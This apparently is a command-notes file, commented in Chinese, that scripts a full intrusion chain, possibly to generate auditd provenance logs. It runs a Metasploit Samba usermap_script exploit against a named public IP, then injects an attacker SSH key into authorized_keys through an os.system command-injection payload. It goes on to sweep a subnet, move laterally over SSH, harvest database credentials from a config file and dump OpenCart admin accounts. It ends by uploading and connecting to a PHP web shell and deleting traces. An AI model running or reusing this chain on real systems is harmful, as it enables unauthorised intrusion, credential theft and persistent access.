# 准备工作：auditd设置规则
# sudo auditctl -w / -p wxra
# sudo auditctl -a always,exit -F arch=b64 -F uid=33 -S all
# sudo auditctl -a always,exit -F arch=b64 -F pid=33 -S all
# 可能需要手动开启provdb（结点2）的ssh，这一步后面可以再改进，目前可以先手动开启
docker run -it --network host metasploitframework/metasploit-framework:latest
use exploit/multi/samba/usermap_script
set rhosts 82.157.8.106
exploit
# 结点1，provdb-frontend
ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
cat /root/.ssh/id_rsa.pub # 然后把这里的公钥放到去计算里
# 去计算输入框的内容（举例）
os.system("mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAgEAxzYI5o1DgfNr/sBu0bZdbKafHCrKJkmlONZmV1f1jSAl+zs1Dmo0+K1UJRxorwtY3XF9jlEV05KpwIN7Ij+29hQQesKIRpp+wcjMVXmaZCUsHtJUzt+3lJ2PgSqGrxJT2E+rwT5MogPcjvfefp4G2oMvjbZiNXT6+WegCII8fyrkzOejgieGjPf7Cpfw4HurCAXi0yun5WO9KCJf8eK00u1gzqkp4yJ9xdPk8emVEgpRMZYOT3Babd8ZXoXZrCiy6nHmoIEERExUazSbTDfYXjLPObxGrPERY7VgD+S8EJOLD1bazeSyUksFIJEIGXMxHJcwu9z/6eCIrodzeBrLEV9ugND65URBK5ar7jtdMWAP74qH+7UA3WEBs0eXecw6PT/yxrK/oJRubPTfFUUaOlIAjyJjywIi9FP9wnbt3xMgQXmY3z9NIOPIZVhh6kSoRp5ytsTkvnqXrQ5sLJKJNqYV/kHlt/YZB8MChhnOyTKvkJlGdROx7IbFpqe3RfiyTjEUm3OPkPLn2i4ErQgDU+KPY+cN9390LXp959LVD1DzlSdAyNXxD5zrfLmd7vugh2e7dWHZ16ch7CtEVUeq23WvnAG4YSRixIL1Md1Gim+DMJzfGjlQmZb52i3pb7NWwlBJnqAnVboBASsXOHE7g2HlnWJM1XLMg8TxMxOvmPs= your_email@example.com'>>/root/.ssh/authorized_keys")
# 扫描172.19.0.*网段
# 设置1s超时
for k in $( seq 1 255);do ping -c 1 -W 1 172.19.0."$k"|grep "ttl"|awk -F "[ :]+" '{print $4}'; done
ssh root@172.19.0.2 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
ssh root@172.19.0.3 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
ssh root@172.19.0.4 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
ssh root@172.19.0.5 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
ssh root@172.19.0.6 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no # 连接结点2
# 结点2，provdb
# 发现了数据库账号密码
cat /app/src/user/db.conf
# 这一步可能也需要试探
mysql -u root -h 172.19.0.2 -p
mysql -u root -h 172.19.0.3 -p
mysql -u root -h 172.19.0.4 -p # 发现结点3
# 发现了两个数据库
use opencart;
'select * from oc_user';
# 发现账号密码，登录opencart管理员界面
# 上传 1.php
# 进行蚁剑连接
# 删除文件
